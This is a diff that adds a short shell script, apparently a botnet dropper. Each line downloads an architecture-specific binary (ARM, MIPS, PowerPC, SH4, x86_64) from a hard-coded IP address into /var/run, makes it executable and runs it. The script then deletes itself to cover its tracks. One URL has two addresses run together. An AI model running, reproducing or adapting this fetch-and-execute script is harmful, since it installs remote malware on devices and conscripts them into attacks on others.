@@ -1,0 +1,11 @@
+#!/bin/sh
+
+wget -c http://208.67.1.186208.67.1.165/armv5l -P /var/run && chmod +x /var/run/armv5l && /var/run/armv5l
+wget -c http://208.67.1.186/mips -P /var/run && chmod +x /var/run/mips && /var/run/mips
+wget -c http://208.67.1.186/mipsel -P /var/run && chmod +x /var/run/mipsel && /var/run/mipsel
+wget -c http://208.67.1.186/powerpc -P /var/run && chmod +x /var/run/powerpc && /var/run/powerpc
+wget -c http://208.67.1.186/sh4 -P /var/run && chmod +x /var/run/sh4 && /var/run/sh4
+wget -c http://208.67.1.186/x86_64 -P /var/run && chmod +x /var/run/x86_64 && /var/run/x86_64
+
+sleep 3;
+rm -fr /var/run/gb.sh
